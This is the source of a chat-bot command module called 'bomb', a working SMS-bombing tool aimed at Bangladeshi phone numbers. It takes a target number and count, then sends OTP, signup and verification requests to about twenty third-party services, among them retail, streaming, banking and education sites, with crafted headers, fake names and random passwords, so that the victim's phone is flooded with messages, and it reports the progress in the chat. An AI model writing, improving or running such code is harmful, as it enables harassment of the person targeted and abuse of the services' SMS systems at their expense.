const axios = require('axios');

module.exports = {
    config: {
        name: "bomb",
        aliases: ["smsbomb", "sms"],
        version: "1.0.0",
        author: "𝐴𝑠𝑖𝑓 𝑀𝑎ℎ𝑚𝑢𝑑",
        countDown: 10,
        role: 2,
        category: "system",
        shortDescription: {
            en: "𝖠𝖽𝗏𝖺𝗇𝖼𝖾𝖽 𝖲𝖬𝖲 𝖻𝗈𝗆𝖻𝗂𝗇𝗀 𝗍𝗈𝗈𝗅"
        },
        longDescription: {
            en: "𝖠𝖽𝗏𝖺𝗇𝖼𝖾𝖽 𝖲𝖬𝖲 𝖻𝗈𝗆𝖻𝗂𝗇𝗀 𝗍𝗈𝗈𝗅 𝗐𝗂𝗍𝗁 𝗆𝗎𝗅𝗍𝗂𝗉𝗅𝖾 𝗌𝖾𝗋𝗏𝗂𝖼𝖾𝗌"
        },
        guide: {
            en: "{p}bomb [𝗉𝗁𝗈𝗇𝖾] [𝖺𝗆𝗈𝗎𝗇𝗍]"
        },
        dependencies: {
            "axios": ""
        }
    },

    onStart: async function({ message, event, args }) {
        try {
            // Dependency check
            let axiosAvailable = true;
            try {
                require("axios");
            } catch (e) {
                axiosAvailable = false;
            }

            if (!axiosAvailable) {
                return message.reply("❌ 𝖬𝗂𝗌𝗌𝗂𝗇𝗀 𝖽𝖾𝗉𝖾𝗇𝖽𝖾𝗇𝖼𝗂𝖾𝗌. 𝖯𝗅𝖾𝖺𝗌𝖾 𝗂𝗇𝗌𝗍𝖺𝗅𝗅 𝖺𝗑𝗂𝗈𝗌.");
            }

            const { threadID } = event;
            const [phone, amountInput] = args;
            
            if (!phone || !amountInput) {
                return message.reply("⚠️ 𝖴𝗌𝖺𝗀𝖾: 𝖻𝗈𝗆𝖻 [𝗉𝗁𝗈𝗇𝖾] [𝖺𝗆𝗈𝗎𝗇𝗍]");
            }

            // Phone number validation
            if (!/^\d+$/.test(phone)) {
                return message.reply("❌ 𝖨𝗇𝗏𝖺𝗅𝗂𝖽 𝗉𝗁𝗈𝗇𝖾 𝗇𝗎𝗆𝖻𝖾𝗋. 𝖯𝗅𝖾𝖺𝗌𝖾 𝗎𝗌𝖾 𝗈𝗇𝗅𝗒 𝖽𝗂𝗀𝗂𝗍𝗌.");
            }

            if (phone.length < 10 || phone.length > 15) {
                return message.reply("❌ 𝖨𝗇𝗏𝖺𝗅𝗂𝖽 𝗉𝗁𝗈𝗇𝖾 𝗇𝗎𝗆𝖻𝖾𝗋 𝗅𝖾𝗇𝗀𝗍𝗁. 𝖬𝗎𝗌𝗍 𝖻𝖾 10-15 𝖽𝗂𝗀𝗂𝗍𝗌.");
            }
            
            const PROTECTED_NUMBERS = ["1586400590", "1845296506"];
            if (PROTECTED_NUMBERS.includes(phone)) {
                return message.reply("🚫 𝖳𝗁𝗂𝗌 𝗇𝗎𝗆𝖻𝖾𝗋 𝗂𝗌 𝗉𝗋𝗈𝗍𝖾𝖼𝗍𝖾𝖽!");
            }
            
            const amount = Math.min(parseInt(amountInput) || 10, 20);
            
            if (amount < 1 || amount > 20) {
                return message.reply("❌ 𝖨𝗇𝗏𝖺𝗅𝗂𝖽 𝖺𝗆𝗈𝗎𝗇𝗍. 𝖯𝗅𝖾𝖺𝗌𝖾 𝗎𝗌𝖾 1-20.");
            }

            try {
                await message.reply(`🚀 𝖲𝗍𝖺𝗋𝗍𝗂𝗇𝗀 𝖲𝖬𝖲 𝖻𝗈𝗆𝖻𝗂𝗇𝗀 𝗈𝗇: ${phone}\n💣 𝖠𝗆𝗈𝗎𝗇𝗍: ${amount}`);
                
                const urls = [
                    `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0${phone}`,
                    `https://www.bioscopelive.com/en/login/send-otp?phone=880${phone}`,
                    "https://www.bioscopelive.com/en/login?type=login",
                    "https://fundesh.com.bd/api/auth/generateOTP?service_key=",
                    "https://fundesh.com.bd/api/auth/resendOTP",
                    "https://api.redx.com.bd/v1/user/signup",
                    `https://api.bongo-solutions.com/auth/api/login/send-otp?phone=880${phone}`,
                    `https://www.rokomari.com/resend-verification-code?email_phone=880${phone}`,
                    `https://www.pizzahutbd.com/customer/sign-in/mobile?phone=0${phone}`,
                    "https://admission.ndub.edu.bd/api/users/register-step-1/",
                    `https://developer.quizgiri.xyz/api/v2.0/send-otp?phone=0${phone}`,
                    "https://api.shikho.com/auth/v2/send/sms",
                    "https://prod-api.viewlift.com/identity/signup?site=hoichoitv",
                    "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber",
                    `https://cms.beta.praavahealth.com/api/v2/user/login/?mobile=${phone}`,
                    "https://themallbd.com/api/auth/otp_login",
                    "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
                    "https://api.wholesalecart.com/v2/user/login-register",
                    "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp",
                    "https://app.ipay.com.bd/api/v1/signup/v2",
                    "https://admission.ndub.edu.bd/api/users/reset/"
                ];
                
                const headersList = [
                    {"operator": "bd-otp"},
                    {"referer": "https://www.bioscopelive.com/en/login"},
                    {"Content-Type": "application/json"},
                    {"Content-Type": "application/json"},
                    {"Content-Type": "application/json"},
                    {
                        "Accept": "application/json, text/plain, */*",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Connection": "keep-alive",
                        "Content-Length": "65",
                        "Cookie": "_ga=GA1.3.1117093475.951445077; _gid=GA1.3.134905361.951445077; WZRK_S_4R6-9R6-155Z=%7B%22p%22%3A1%2C%22s%22%3A951410497%2C%22t%22%3A951445096%7D; WZRK_G=6184e322525e444ab0f771f7f041933a; _fbp=fb.2.951445106167.1213159921; _hjSessionUser_2064965=eyJpZCI6ImRhMmMzMDY1LWNkMDYtNWFlOC04NTA4LTg0MzYzYWM4Y2RiNyIsImNyZWF0ZWQiOjE2NTE0NDUxMDkwMjMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2064965=eyJpZCI6IjMxMGI0MDQ2LTY3OGUtNDM2OS1hOWY1LTRlYzlmOWEyMDhkNCIsImNyZWF0ZWQiOjE2NTE0NDUxMTg1NzgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1",
                        "Host": "api.redx.com.bd",
                        "Origin": "https://redx.com.bd",
                        "Referer": "https://redx.com.bd/registration/",
                        "TE": "Trailers",
                        "User-Agent": "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0",
                        "x-access-token": "Bearer null"
                    },
                    {"Content-Type": "application/json"},
                    {"Content-Type": "application/x-www-form-urlencoded"},
                    {"Content-Type": "application/json"},
                    {"Content-Type": "application/json"},
                    {"Content-Type": "application/json"},
                    {"X-Requested-With": "XMLHttpRequest"},
                    {"Content-Type": "application/json"},
                    {"Content-Type": "application/json"},
                    {"Content-Type": "application/json"},
                    {"Content-Type": "application/json"},
                    {"Content-Type": "application/json"}
                ];
                
                const dataList = [
                    null,
                    null,
                    null,
                    `{"msisdn":"${phone}"}`,
                    `{"msisdn":"${phone}"}`,
                    `{"name":"${generateRandomString(4)}","phoneNumber":"${phone}","service":"redx"}`,
                    `{"operator":"all","msisdn":"880${phone}"}`,
                    null,
                    `_token=${generateRandomString(32)}&phone_number=0${phone}`,
                    `{"name":"${generateRandomString(5)}","email":"${generateRandomString(7)}@gmail.com","phone":"0${phone}","password":"1q2w3e4r","confirmPassword":"1q2w3e4r"}`,
                    `{"phone":"0${phone}","country_code":"+880","fcm_token":null}`,
                    `{"phone":"+880${phone}","email":null,"auth_type":"login"}`,
                    `{"send":"true","phoneNumber":"${phone}","emailConsent":"true","whatsappConsent":"true"}`,
                    `{"AccessToken": "","TrackingNo": "","mobileNo": "0${phone}","otpSms": "","product_id": "201","requestChannel": "MOB","trackingStatus": 5}`,
                    null,
                    `{"phone_number":"+880${phone}"}`,
                    `{"name":"${generateRandomString(5)}","mobile_no":"0${phone}","password":"${generateRandomString(16)}","confirm_password":"${generateRandomString(16)}"}`,
                    `{"platform":"google","url":"https://www.google.com/","phone":"${phone}"}`,
                    `{"accountType":1,"deviceId":"mobile-android-SM-N971N-${generateRandomString(16)}","mobileNumber":"+880${phone}"}`,
                    `{"phone": "0${phone}"}`
                ];
                
                let successCount = 0;
                let failedCount = 0;
                let progressMessage = "";
                let currentProgress = 0;
                
                // Send initial progress
                const progressMsg = await message.reply(
                    `📊 𝖡𝗈𝗆𝖻𝗂𝗇𝗀 𝖯𝗋𝗈𝗀𝗋𝖾𝗌𝗌: 0%\n` +
                    `✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝗌: 0 | ❌ 𝖥𝖺𝗂𝗅𝖾𝖽: 0\n` +
                    `─────────────────\n` +
                    `🔄 𝖲𝗍𝖺𝗋𝗍𝗂𝗇𝗀...`
                );

                for (let i = 0; i < amount; i++) {
                    try {
                        const url = urls[i];
                        const headers = headersList[i] || {};
                        const data = dataList[i];
                        
                        let response;
                        if (data) {
                            response = await axios.post(url, data, { 
                                headers,
                                timeout: 10000 
                            });
                        } else {
                            response = await axios.get(url, { 
                                headers,
                                timeout: 10000 
                            });
                        }
                        
                        if (response.status >= 200 && response.status < 300) {
                            successCount++;
                            progressMessage += `✅ ${url.split('/')[2]}\n`;
                        } else {
                            failedCount++;
                            progressMessage += `❌ ${url.split('/')[2]}\n`;
                        }
                        
                    } catch (error) {
                        failedCount++;
                        progressMessage += `🔥 ${urls[i].split('/')[2]}\n`;
                    }
                    
                    currentProgress = i + 1;
                    const progressPercent = Math.round((currentProgress / amount) * 100);
                    
                    // Update progress every 5 requests or when complete
                    if ((i + 1) % 5 === 0 || i === amount - 1) {
                        try {
                            await message.unsendMessage(progressMsg.messageID);
                        } catch (unsendError) {
                            console.warn("𝖢𝗈𝗎𝗅𝖽 𝗇𝗈𝗍 𝗎𝗇𝗌𝖾𝗇𝖽 𝗉𝗋𝗈𝗀𝗋𝖾𝗌𝗌 𝗆𝖾𝗌𝗌𝖺𝗀𝖾:", unsendError.message);
                        }
                        
                        const progressMsg = await message.reply(
                            `📊 𝖡𝗈𝗆𝖻𝗂𝗇𝗀 𝖯𝗋𝗈𝗀𝗋𝖾𝗌𝗌: ${progressPercent}%\n` +
                            `✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝗌: ${successCount} | ❌ 𝖥𝖺𝗂𝗅𝖾𝖽: ${failedCount}\n` +
                            `─────────────────\n` +
                            progressMessage
                        );
                        progressMessage = "";
                    }
                    
                    // Add delay between requests
                    await new Promise(resolve => setTimeout(resolve, 800));
                }
                
                const finalMessage = 
                    `🎯 𝖡𝗈𝗆𝖻𝗂𝗇𝗀 𝖢𝗈𝗆𝗉𝗅𝖾𝗍𝖾𝖽!\n` +
                    `─────────────────\n` +
                    `📱 𝖳𝖺𝗋𝗀𝖾𝗍: ${phone}\n` +
                    `💣 𝖳𝗈𝗍𝖺𝗅 𝖲𝖾𝗇𝗍: ${amount}\n` +
                    `✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝗌𝖿𝗎𝗅: ${successCount}\n` +
                    `❌ 𝖥𝖺𝗂𝗅𝖾𝖽: ${failedCount}\n` +
                    `📈 𝖲𝗎𝖼𝖼𝖾𝗌𝗌 𝖱𝖺𝗍𝖾: ${Math.round((successCount / amount) * 100)}%\n` +
                    `⚡ 𝖯𝗈𝗐𝖾𝗋𝖾𝖽 𝖡𝗒: 𝖠𝗌𝗂𝖿 𝖬𝖺𝗁𝗆𝗎𝖽`;

                await message.reply(finalMessage);
                
            } catch (error) {
                console.error("💥 𝖡𝗈𝗆𝖻𝗂𝗇𝗀 𝗉𝗋𝗈𝖼𝖾𝗌𝗌 𝖾𝗋𝗋𝗈𝗋:", error);
                await message.reply("❌ 𝖠𝗇 𝖾𝗋𝗋𝗈𝗋 𝗈𝖼𝖼𝗎𝗋𝗋𝖾𝖽 𝖽𝗎𝗋𝗂𝗇𝗀 𝗍𝗁𝖾 𝖻𝗈𝗆𝖻𝗂𝗇𝗀 𝗉𝗋𝗈𝖼𝖾𝗌𝗌.");
            }

        } catch (error) {
            console.error("💥 𝖡𝗈𝗆𝖻 𝖼𝗈𝗆𝗆𝖺𝗇𝖽 𝖾𝗋𝗋𝗈𝗋:", error);
            // Don't send error message to avoid spam
        }
    }
};

function generateRandomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}
